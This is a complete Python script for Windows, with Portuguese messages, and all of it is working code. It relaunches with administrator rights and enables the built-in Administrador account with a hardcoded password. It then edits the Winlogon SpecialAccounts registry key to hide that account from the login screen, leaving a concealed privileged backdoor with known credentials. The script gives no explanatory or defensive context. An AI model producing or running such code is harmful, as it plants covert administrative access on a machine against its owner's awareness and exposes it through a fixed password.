import subprocess
import ctypes
import sys
import winreg

def run_as_admin():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("Reexecutando como administrador...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

def ativar_conta_administrador():
    print("Ativando conta Administrador...")
    subprocess.run('net user Administrador /active:yes', shell=True, check=True)
    subprocess.run('net user Administrador mj2145mj', shell=True, check=True)
    print("Senha definida e conta ativada.")

def ocultar_conta_login():
    print("Ocultando conta Administrador da tela de login...")

    try:
        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Administrador", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print("Conta oculta com sucesso.")
    except PermissionError:
        print("Erro: Permissões de administrador necessárias.")
    except Exception as e:
        print(f"Erro inesperado: {e}")

if __name__ == "__main__":
    run_as_admin()
    try:
        ativar_conta_administrador()
        ocultar_conta_login()
        print("Concluído com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar comandos: {e}")
